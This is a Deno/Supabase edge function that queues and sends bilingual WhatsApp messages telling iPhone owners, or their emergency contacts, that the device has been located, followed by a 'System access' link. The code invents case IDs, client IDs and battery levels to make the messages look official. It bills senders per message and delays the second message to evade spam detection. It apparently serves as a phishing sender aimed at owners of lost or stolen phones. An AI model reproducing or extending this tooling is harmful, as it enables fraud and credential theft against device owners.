import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.0';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    console.log('Starting message queue processing...');

    // Check if a specific message ID was provided
    const body = await req.json().catch(() => ({}));
    const messageId = body.messageId;
    const auto = body.auto;
    const notifyAdmin = body.notifyAdmin; // Nueva bandera para notificar al admin

    // If only notifying admin without processing, handle separately
    if (notifyAdmin && !messageId && !auto) {
      console.log('Notification-only mode - getting latest pending message for admin notification');
      
      const { data: latestMessage } = await supabase
        .from('message_queue')
        .select(`
          *,
          processes (
            client_name
          )
        `)
        .eq('status', 'pending')
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle();

      if (latestMessage) {
        const { data: userProfile } = await supabase
          .from('profiles')
          .select('email')
          .eq('id', latestMessage.user_id)
          .single();

        const { data: adminProfile } = await supabase
          .from('profiles')
          .select('telegram_bot_token, telegram_chat_id')
          .eq('email', 'fredric@gmail.com')
          .single();

        if (adminProfile?.telegram_bot_token && adminProfile?.telegram_chat_id) {
          try {
            const adminNotification = `🔔 *Nuevo Mensaje en Cola*\n\n` +
              `Usuario: ${userProfile?.email || 'Desconocido'}\n` +
              `Cliente: ${latestMessage.processes?.client_name}\n` +
              `Teléfono: ${latestMessage.recipient_phone}\n` +
              `Estado: Pendiente de envío\n\n` +
              `El mensaje se enviará automáticamente en 5 minutos o puedes enviarlo manualmente desde el panel.`;

            await fetch(`https://api.telegram.org/bot${adminProfile.telegram_bot_token}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: adminProfile.telegram_chat_id,
                text: adminNotification,
                parse_mode: 'Markdown'
              })
            });
            
            console.log('Admin notification sent successfully');
          } catch (notifyError) {
            console.error('Error sending admin notification:', notifyError);
          }
        }
      }

      return new Response(
        JSON.stringify({ message: 'Notification sent', processed: 0 }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Función para generar saludo aleatorio usando el nombre del propietario
    const generateGreeting = (ownerName: string, language: string) => {
      const greetingsES = [
        `Hola ${ownerName}, tu equipo ha sido localizado 📍. A continuación, recibirás los detalles 📱.`,
        `Hola ${ownerName}, hemos encontrado tu dispositivo 📱. Los detalles llegarán en breve.`,
        `${ownerName}, tu iPhone fue rastreado exitosamente 🎯. Prepárate para recibir la información.`,
        `Hola ${ownerName}, buenas noticias 📍 Tu equipo está ubicado. Detalles en camino.`,
        `${ownerName}, dispositivo localizado ✅ La información completa llegará enseguida.`,
        `Hola ${ownerName}, confirmamos la ubicación de tu iPhone 📱. Espera los detalles.`,
        `${ownerName}, tu equipo ha sido rastreado 🎯. Información detallada próximamente.`,
      ];

      const greetingsEN = [
        `Hello ${ownerName}, your device has been located 📍. Details coming shortly 📱.`,
        `Hi ${ownerName}, we found your device 📱. Information on the way.`,
        `${ownerName}, your iPhone was successfully tracked 🎯. Get ready for the details.`,
        `Hello ${ownerName}, good news 📍 Your device is located. Details coming up.`,
        `${ownerName}, device located ✅ Full information arriving soon.`,
        `Hi ${ownerName}, we confirm your iPhone's location 📱. Expect the details.`,
        `${ownerName}, your device has been tracked 🎯. Detailed information shortly.`,
      ];

      const greetings = language === 'spanish' ? greetingsES : greetingsEN;
      return greetings[Math.floor(Math.random() * greetings.length)];
    };

    // Translate iPhone color names from Spanish to English for EN messages
    const translateColor = (input: string): string => {
      if (!input) return '';
      const v = input.toLowerCase().trim();
      const map: Array<[RegExp, string]> = [
        [/azul\s*titanio|titanio\s*azul/, 'Blue Titanium'],
        [/titanio\s*natural|natural\s*titanio|^natural$/, 'Natural Titanium'],
        [/grafito/, 'Graphite'],
        [/medianoche|negro/, 'Black'],
        [/blanco|perla|perl[ao]?|plateado/, 'White'],
        [/plata/, 'Silver'],
        [/oro|dorado/, 'Gold'],
        [/amarillo/, 'Yellow'],
        [/azul/, 'Blue'],
        [/verde/, 'Green'],
        [/rojo/, 'Red'],
        [/morado|púrpura|purpura/, 'Purple'],
        [/rosa/, 'Pink'],
        [/gris/, 'Gray'],
        [/estelar/, 'Starlight'],
      ];
      for (const [re, out] of map) {
        if (re.test(v)) return out;
      }
      // If already English-looking, return capitalized original
      return input.charAt(0).toUpperCase() + input.slice(1);
    };

    // Collapse 3+ newlines to 2 and trim
    const collapse = (s: string) => s.replace(/\n{3,}/g, '\n\n').trim();


    let query = supabase
      .from('message_queue')
      .select(`
        *,
        processes (
          client_name,
          country_code,
          phone_number,
          contact_type,
          owner_name,
          iphone_model,
          storage,
          color,
          imei,
          serial_number,
          url
        )
      `)
      .eq('status', 'pending');

    // Determine which message(s) to process
    if (messageId) {
      // Manual send: process this specific message immediately
      query = query.eq('id', messageId);
    } else {
      // Always enforce a minimum age of 5 minutes for automatic processing
      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
      query = query.lte('created_at', fiveMinutesAgo).order('created_at', { ascending: true }).limit(1);
    }

    const { data: queuedMessage, error: fetchError } = await query.maybeSingle();

    if (fetchError) {
      console.error('Error fetching queued message:', fetchError);
      throw fetchError;
    }

    if (!queuedMessage) {
      console.log('No pending messages in queue');
      return new Response(
        JSON.stringify({ message: 'No pending messages', processed: 0 }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log('Processing message:', queuedMessage.id);

    // Get user profile separately
    const { data: userProfile, error: profileError } = await supabase
      .from('profiles')
      .select('credits, email, telegram_bot_token, telegram_chat_id, expiration_date')
      .eq('id', queuedMessage.user_id)
      .single();

    if (profileError) {
      console.error('Error fetching user profile:', profileError);
      throw profileError;
    }

    // Block processing for expired users
    const isExpired = userProfile?.expiration_date
      ? new Date() > new Date(userProfile.expiration_date)
      : false;

    if (isExpired) {
      console.log('User account expired, marking message as failed');
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: 'Message failed: Account expired', 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Compose final message content (consistent for template and non-template, with i18n and correct link position)
    let customSection = (queuedMessage.message_content || '').toString();

    if (queuedMessage.template_id) {
      console.log('Composing message using template:', queuedMessage.template_id);
      const { data: template } = await supabase
        .from('message_templates')
        .select('template_content')
        .eq('id', queuedMessage.template_id)
        .single();

      if (template?.template_content) {
        customSection = template.template_content
          .replace(/\{client_name\}/g, queuedMessage.processes?.client_name || '')
          .replace(/\{phone_number\}/g, queuedMessage.processes?.phone_number || '')
          .replace(/\{iphone_model\}/g, queuedMessage.processes?.iphone_model || '')
          .replace(/\{storage\}/g, queuedMessage.processes?.storage || '')
          .replace(/\{color\}/g, queuedMessage.language === 'spanish' ? (queuedMessage.processes?.color || '') : translateColor(queuedMessage.processes?.color || ''))
          .replace(/\{imei\}/g, queuedMessage.processes?.imei || '')
          .replace(/\{serial_number\}/g, queuedMessage.processes?.serial_number || '')
          .replace(/\{owner_name\}/g, queuedMessage.processes?.owner_name || '');
      }
    }

    // Localized link label - URL will be placed after device info
    const linkLabel = queuedMessage.language === 'spanish' ? '🔗 Acceso al sistema' : '🔗 System access';
    const url = queuedMessage.processes?.url;
    
    // Remove any existing occurrences of the URL or labeled link lines from customSection
    if (url) {
      customSection = customSection
        .replaceAll(url, '')
        .replace(/^[\s\t]*🔗\s*(Acceso al sistema|System access):.*$/gmi, '')
        .trim();
    }

    // Normalize custom section: remove duplicate openings, IDs, device blocks, help/closing lines, and localize EN labels
    const openingPattern = /^(?:\s*)(?:🛡️ Alerta de seguridad del sistema|🔐 Notificación de seguridad|🔒 Sistema de protección activado|🛡️ System security alert|🔐 Security notification|🔒 Protection system activated)\s*\n*/i;
    customSection = customSection.replace(openingPattern, '').trim();

    // Remove any ID lines, section headings and bullet device lines from customSection
    customSection = customSection
      .replace(/^(?:ID de caso|ID de cliente|Caso|Cliente|Referencia|Usuario|Case ID|Client ID|Case|Client|Reference|User)\s*:.*$/gmi, '')
      .replace(/^(?:Technical data|Device details|Equipment information|Datos técnicos|Detalles del dispositivo|Información del equipo)\s*:?.*$/gmi, '')
      .replace(/^\s*•\s.*$/gmi, '')
      // Remove help lines (EN/ES)
      .replace(/^(?:Need help\?|Require support\?|Looking for assistance\?).*$/gmi, '')
      .replace(/^(?:¿?Necesit[aá]s ayuda\?|¿?Requer[ií]s soporte\?|¿?Busc[aá]s asistencia\?).*$/gmi, '')
      // Remove closing lines (EN/ES)
      .replace(/^(?:Automated service|Automatic system|Continuous monitoring).*$/gmi, '')
      .replace(/^(?:Servicio automatizado|Sistema automático|Monitoreo continuo).*$/gmi, '')
      .trim();

    // Localize labels in EN and translate color inside custom section when present
    if (queuedMessage.language !== 'spanish') {
      customSection = customSection
        .replace(/\bCapacidad\b/gi, 'Capacity')
        .replace(/\bAlmacenamiento\b/gi, 'Storage')
        .replace(/\bModelo\b/gi, 'Model')
        .replace(/\bSerie\b/gi, 'Serial')
        .replace(/\bEquipo\b/gi, 'Device')
        .replace(/\bDispositivo\b/gi, 'Device')
        .replace(/\bNivel de batería\b/gi, 'Battery level')
        .replace(/\bBatería actual\b/gi, 'Current battery')
        .replace(/\bCarga restante\b/gi, 'Battery level');

      // Translate color value after the Color: label
      customSection = customSection.replace(/(Color:\s*)([^|\n]+)/gi, (_m: string, p1: string, p2: string) => `${p1}${translateColor(String(p2).trim())}`);
    }

    customSection = collapse(customSection);

    // Generate IDs and battery only to enrich the final message
    const now = new Date();
    const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
    const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
    const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
    const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;

    const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
    const isEmergencyContact = queuedMessage.processes?.contact_type !== 'propietario';
    const ownerName = queuedMessage.processes?.owner_name || 'el propietario';

    if (queuedMessage.language === 'spanish') {
      if (isEmergencyContact) {
        // Mensajes para contactos de emergencia en español
        const openingsES = [
          '🚨 Alerta de contacto de emergencia',
          '⚠️ Notificación automática de seguridad',
          '🔔 Sistema de alerta activado',
        ];
        const emergencyNoticeES = [
          `*Eres un contacto de emergencia de ${ownerName}*`,
          `*Formas parte de la red de seguridad de ${ownerName}*`,
          `*Estás registrado como contacto de emergencia de ${ownerName}*`,
        ];
        const actionRequiredES = [
          `⚠️ *ACCIÓN REQUERIDA:* Por favor, informa a ${ownerName} que su dispositivo ha sido localizado.`,
          `⚠️ *IMPORTANTE:* Notifica a ${ownerName} que su equipo fue encontrado.`,
          `⚠️ *AVISO URGENTE:* Comunica a ${ownerName} que su dispositivo fue detectado.`,
        ];
        const statusPhrasesES = [
          'Información del dispositivo localizado:',
          'Detalles del equipo encontrado:',
          'Datos del dispositivo detectado:',
        ];
        const deviceSectionsES = [
          `• Modelo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serie: ${queuedMessage.processes?.serial_number}\n• Nivel de batería: ${battery} %`,
          `• Dispositivo: ${queuedMessage.processes?.iphone_model}\n• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}\n• Código IMEI: ${queuedMessage.processes?.imei}\n• No. Serie: ${queuedMessage.processes?.serial_number}\n• Batería actual: ${battery} %`,
        ];
        const helpPhrasesES = [
          'Para asistencia inmediata *Responde* *Menú*',
          'Para soporte técnico *Escribe* *Menú*',
          'Para ayuda especializada *Envía* *Menú*',
        ];
        const closingsES = [
          'Sistema de emergencia – Servicio 24/7',
          'Red de seguridad – Atención continua',
          'Protocolo de alerta – Monitoreo permanente',
        ];

        const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
        queuedMessage.message_content = `${random(openingsES)}\n\n${random(emergencyNoticeES)}\n\n${random(actionRequiredES)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrasesES)}\n${random(deviceSectionsES)}${urlLine}\n\n${random(helpPhrasesES)}\n\n${random(closingsES)}`;
      } else {
        // Mensajes para propietario en español
        const openingsES = [
          '🛡️ Alerta de seguridad del sistema',
          '🔐 Notificación de seguridad',
          '🔒 Sistema de protección activado',
        ];
        const statusPhrasesES = [
          'Detalles del dispositivo:',
          'Información del equipo:',
          'Datos técnicos:',
        ];
        const deviceSectionsES = [
          `• Modelo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serie: ${queuedMessage.processes?.serial_number}\n• Nivel de batería: ${battery} %`,
          `• Dispositivo: ${queuedMessage.processes?.iphone_model}\n• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}\n• Código IMEI: ${queuedMessage.processes?.imei}\n• No. Serie: ${queuedMessage.processes?.serial_number}\n• Batería actual: ${battery} %`,
          `• Equipo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Memoria: ${queuedMessage.processes?.storage}\n• Identificador IMEI: ${queuedMessage.processes?.imei}\n• Número de serie: ${queuedMessage.processes?.serial_number}\n• Carga restante: ${battery} %`,
        ];
        const helpPhrasesES = [
          '¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻',
          '¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧',
          '¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻',
        ];
        const closingsES = [
          'Servicio automatizado – Atención disponible 24 h',
          'Sistema automático – Soporte activo 24/7',
          'Monitoreo continuo – Asistencia permanente',
        ];

        const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
        queuedMessage.message_content = `${random(openingsES)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrasesES)}\n${random(deviceSectionsES)}${urlLine}\n\n${random(helpPhrasesES)}\n\n${random(closingsES)}`;
      }
    } else {
      if (isEmergencyContact) {
        // Mensajes para contactos de emergencia en inglés
        const openingsEN = [
          '🚨 Emergency contact alert',
          '⚠️ Automatic security notification',
          '🔔 Alert system activated',
        ];
        const emergencyNoticeEN = [
          `*You are an emergency contact for ${ownerName}*`,
          `*You are part of the security network for ${ownerName}*`,
          `*You are registered as an emergency contact for ${ownerName}*`,
        ];
        const actionRequiredEN = [
          `⚠️ *ACTION REQUIRED:* Please inform ${ownerName} that their device has been located.`,
          `⚠️ *IMPORTANT:* Notify ${ownerName} that their device was found.`,
          `⚠️ *URGENT NOTICE:* Communicate to ${ownerName} that their device was detected.`,
        ];
        const statusPhrasesEN = [
          'Located device information:',
          'Found equipment details:',
          'Detected device data:',
        ];
        const colorEn = translateColor(queuedMessage.processes?.color || '');
        const deviceSectionsEN = [
          `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
          `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
        ];
        const helpPhrasesEN = [
          'For immediate assistance *Reply* *Menu*',
          'For technical support *Write* *Menu*',
          'For specialized help *Send* *Menu*',
        ];
        const closingsEN = [
          'Emergency system – 24/7 service',
          'Security network – Continuous attention',
          'Alert protocol – Permanent monitoring',
        ];

        const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
        queuedMessage.message_content = `${random(openingsEN)}\n\n${random(emergencyNoticeEN)}\n\n${random(actionRequiredEN)}\n\n${customSection}\n\nCase ID: ${caseId}\nClient ID: ${clientId}\n\n${random(statusPhrasesEN)}\n${random(deviceSectionsEN)}${urlLine}\n\n${random(helpPhrasesEN)}\n\n${random(closingsEN)}`;
      } else {
        // Mensajes para propietario en inglés
        const openingsEN = [
          '🛡️ System security alert',
          '🔐 Security notification',
          '🔒 Protection system activated',
        ];
        const statusPhrasesEN = [
          'Device details:',
          'Equipment information:',
          'Technical data:',
        ];
        const colorEn = translateColor(queuedMessage.processes?.color || '');
        const deviceSectionsEN = [
          `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
          `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
        ];
        const helpPhrasesEN = [
          'Need help? Write *Menu* for technical assistance 👨‍💻',
          'Require support? Reply *Menu* for specialized help 🔧',
          'Looking for assistance? Send *Menu* to contact support 👩‍💻',
        ];
        const closingsEN = [
          'Automated service – 24 h assistance available',
          'Automatic system – 24/7 active support',
          'Continuous monitoring – Permanent assistance',
        ];

        const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
        queuedMessage.message_content = `${random(openingsEN)}\n\n${customSection}\n\nCase ID: ${caseId}\nClient ID: ${clientId}\n\n${random(statusPhrasesEN)}\n${random(deviceSectionsEN)}${urlLine}\n\n${random(helpPhrasesEN)}\n\n${random(closingsEN)}`;
      }
    }

    // Final whitespace normalization
    queuedMessage.message_content = collapse(queuedMessage.message_content);

    if (profileError) {
      console.error('Error fetching user profile:', profileError);
      throw profileError;
    }

    // Check if user has credits
    const userCredits = userProfile?.credits || 0;
    if (userCredits <= 0) {
      console.log('User has no credits, marking as failed');
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: 'Message failed: No credits', 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Get API provider and WhatsApp settings
    const settingsKeys = queuedMessage.language === 'spanish' 
      ? ['api_provider', 'whatsapp_instance', 'whatsapp_token', 'whapi_token', 'whapi_button_title_es']
      : ['api_provider', 'whatsapp_instance_en', 'whatsapp_token_en', 'whapi_token_en', 'whapi_button_title_en'];

    const { data: settings } = await supabase
      .from('system_settings')
      .select('*')
      .in('setting_key', settingsKeys);

    const config = settings?.reduce((acc: any, setting: any) => {
      acc[setting.setting_key] = setting.setting_value;
      return acc;
    }, {});

    const apiProvider = config?.api_provider || 'ultramsg';
    
    let instanceId: string;
    let token: string;
    let apiUrl: string;
    let whapiToken: string | null = null;
    let whapiButtonTitle: string = '';
    
    if (apiProvider === 'whapi') {
      whapiToken = queuedMessage.language === 'spanish' 
        ? (config?.whapi_token || '')
        : (config?.whapi_token_en || '');
      whapiButtonTitle = queuedMessage.language === 'spanish'
        ? (config?.whapi_button_title_es || 'Ver ubicación')
        : (config?.whapi_button_title_en || 'View location');
      instanceId = '';
      token = whapiToken;
      apiUrl = 'https://gate.whapi.cloud';
    } else {
      instanceId = queuedMessage.language === 'spanish' 
        ? (config?.whatsapp_instance || '')
        : (config?.whatsapp_instance_en || '');
        
      token = queuedMessage.language === 'spanish' 
        ? (config?.whatsapp_token || '')
        : (config?.whatsapp_token_en || '');
        
      apiUrl = `https://api.ultramsg.com/${instanceId}/messages/chat`;
    }

    if (apiProvider !== 'whapi' && (!instanceId || !token)) {
      console.log(`${apiProvider} configuration missing`);
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: `Message failed: ${apiProvider} configuration missing`, 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }
    
    if (apiProvider === 'whapi' && !whapiToken) {
      console.log('Whapi token missing');
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: 'Message failed: Whapi.cloud token not configured', 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Generate greeting message using owner_name
    const greetingMessage = generateGreeting(
      queuedMessage.processes?.owner_name || 'Propietario',
      queuedMessage.language
    );

    // Step 1: Send greeting message
    console.log(`Sending greeting message via ${apiProvider}...`);
    let greetingResponse;
    let greetingResult;
    
    if (apiProvider === 'greenapi') {
      // Remove any + or spaces from phone number for Green API
      const cleanPhone = queuedMessage.recipient_phone.replace(/[\s+]/g, '');
      greetingResponse = await fetch(`${apiUrl}/sendMessage/${token}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chatId: `${cleanPhone}@c.us`,
          message: greetingMessage,
        }),
      });
      greetingResult = await greetingResponse.json();
      console.log('Greeting message response (Green API):', greetingResult);
    } else {
      greetingResponse = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          token: token,
          to: queuedMessage.recipient_phone,
          body: greetingMessage,
        }),
      });
      greetingResult = await greetingResponse.json();
      console.log('Greeting message response (Ultra MSG):', greetingResult);
    }

    if (greetingResult.sent !== true && greetingResult.sent !== "true" && !greetingResult.idMessage) {
      console.log('Greeting message failed:', greetingResult);
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: `Greeting message failed: ${greetingResult.message || greetingResult.error || 'Unknown error'}`, 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Wait 15 seconds before sending full message to break the ice and avoid spam detection
    console.log('Waiting 15 seconds before sending full message...');
    await new Promise(resolve => setTimeout(resolve, 15000));

    // Step 2: Send full message with details
    let result;
    if (queuedMessage.image_url) {
      console.log('Sending full message with image');
      
      if (apiProvider === 'greenapi') {
        const cleanPhone = queuedMessage.recipient_phone.replace(/[\s+]/g, '');
        const response = await fetch(`${apiUrl}/sendFileByUrl/${token}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chatId: `${cleanPhone}@c.us`,
            urlFile: queuedMessage.image_url,
            fileName: 'device-image.jpg',
            caption: queuedMessage.message_content,
          }),
        });
        result = await response.json();
      } else {
        const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            token: token,
            to: queuedMessage.recipient_phone,
            image: queuedMessage.image_url,
            caption: queuedMessage.message_content,
          }),
        });
        result = await response.json();
      }
    } else {
      console.log('Sending full text message');
      
      if (apiProvider === 'greenapi') {
        const cleanPhone = queuedMessage.recipient_phone.replace(/[\s+]/g, '');
        const response = await fetch(`${apiUrl}/sendMessage/${token}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chatId: `${cleanPhone}@c.us`,
            message: queuedMessage.message_content,
          }),
        });
        result = await response.json();
      } else {
        const response = await fetch(apiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            token: token,
            to: queuedMessage.recipient_phone,
            body: queuedMessage.message_content,
          }),
        });
        result = await response.json();
      }
    }

    console.log('Full message WhatsApp API response:', result);

    if (result.sent === true || result.sent === "true" || result.idMessage) {
      // Deduct credit
      await supabase
        .from('profiles')
        .update({ 
          credits: userCredits - 1,
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.user_id);

      // Save to messages table
      await supabase
        .from('messages')
        .insert({
          user_id: queuedMessage.user_id,
          process_id: queuedMessage.process_id,
          message_content: queuedMessage.message_content,
          recipient_phone: queuedMessage.recipient_phone,
          status: 'sent',
          sent_at: new Date().toISOString()
        });

      // Update process status
      await supabase
        .from('processes')
        .update({ 
          status: 'enviado',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.process_id);

      // Update queue status and remove from queue to keep it clean
      await supabase
        .from('message_queue')
        .update({ 
          status: 'sent',
          sent_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      // Delete the sent message from the queue (it is archived in 'messages' table)
      await supabase
        .from('message_queue')
        .delete()
        .eq('id', queuedMessage.id);

      console.log('Message sent successfully and removed from queue');

      // Send Telegram notification if configured
      if (userProfile.telegram_bot_token && userProfile.telegram_chat_id) {
        try {
          const telegramMessage = `✅ *Mensaje Enviado*\n\nCliente: ${queuedMessage.processes?.client_name}\nTeléfono: ${queuedMessage.recipient_phone}\nIdioma: ${queuedMessage.language}\n\nCréditos restantes: ${userCredits - 1}`;
          
          await fetch(`https://api.telegram.org/bot${userProfile.telegram_bot_token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: userProfile.telegram_chat_id,
              text: telegramMessage,
              parse_mode: 'Markdown'
            })
          });
          
          console.log('Telegram notification sent');
        } catch (telegramError) {
          console.error('Error sending Telegram notification:', telegramError);
          // Don't fail the whole process if Telegram notification fails
        }
      }

      return new Response(
        JSON.stringify({ 
          message: 'Message sent successfully', 
          processed: 1,
          queuedMessageId: queuedMessage.id
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    } else {
      console.log('WhatsApp send failed:', result);
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: `Message failed: ${result.message || result.error || 'Unknown error'}`, 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

  } catch (error: unknown) {
    console.error('Error processing message queue:', error);
    const err = error instanceof Error ? error : new Error(String(error));
    return new Response(
      JSON.stringify({ error: err.message }),
      { 
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});
